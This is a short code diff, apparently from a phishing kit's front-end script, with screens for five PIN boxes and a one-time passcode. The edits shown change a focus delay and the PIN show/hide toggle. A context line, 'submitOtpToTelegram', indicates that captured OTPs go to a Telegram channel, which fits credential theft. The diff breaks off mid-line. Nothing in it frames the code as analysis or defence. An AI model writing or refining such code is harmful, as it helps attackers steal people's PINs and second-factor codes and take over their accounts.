@@ -232,7 +232,7 @@
       showScreen(screens.pin);
       setTimeout(() => {
         if (pinBoxes5[0]) pinBoxes5[0].focus();
-      }, 40);
+      }, 30);
 
       try {
         const res = await fetch(
@@ -498,12 +498,12 @@
           showScreen(screens.form3);
           break;
         case 'btn-toggle-pin-visibility': {
-          const makeVisible = pinBoxes5[0] && pinBoxes5[0].type === 'password';
+          const makeRevealed = pinBoxes5[0] && !pinBoxes5[0].classList.contains('revealed');
           pinBoxes5.forEach((box) => {
-            box.type = makeVisible ? 'text' : 'password';
+            box.classList.toggle('revealed', makeRevealed);
           });
           if (btnTogglePinVisibility) {
-            btnTogglePinVisibility.innerText = makeVisible ? 'Hide' : 'Show';
+            btnTogglePinVisibility.innerText = makeRevealed ? 'Hide' : 'Show';
           }
           break;
         }
@@ -551,4 +551,4 @@
           await submitOtpToTelegram(otpVal, false);
           break;
         }
-        case 'btn-succe
+       
